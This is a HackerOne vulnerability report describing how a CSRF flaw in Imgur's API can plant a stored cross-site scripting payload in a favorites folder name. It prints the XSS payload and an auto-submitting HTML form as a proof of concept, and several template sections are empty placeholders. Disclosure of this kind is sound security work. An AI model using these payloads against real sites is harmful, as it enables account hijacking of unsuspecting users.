# CSRF leads to a stored self xss

## Metadata
- **Source:** HackerOne
- **Report:** 323005 | https://hackerone.com/reports/323005
- **Submitted:** 2018-03-06
- **Reporter:** hogarth45
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Followup from #311460

#Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.

#Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.

This can be verified by following these steps
* Visit your favorites
* Create New Folder
* Change name to
```
"'><img src=x onerror=prompt(1)>
```
* Sa

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Followup from #311460

#Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.

#Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.

This can be verified by following these steps
* Visit your favorites
* Create New Folder
* Change name to
```
"'><img src=x onerror=prompt(1)>
```
* Save
* Visit a photo
* Click the little plus next to the heart on bottom left of image
* Add to the folder
* xss will launch

Since self xss is out of scope, we will need a method of delivering this attack to a user.
This can be done via a CSRF to create a favorites folder.

# POC

Using a form like so to create the CSRF:
```
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
```

Or be logged into your imgur account and visit

http://blackdoorsec.net/sandbox/imgur2.html

This will create the folder with an xss name that can be used to attack an account.

## Impact

account hijacking
since a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal

#Scenerio
since reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.

</details>

---
*Analysed by Claude on 2026-05-24*
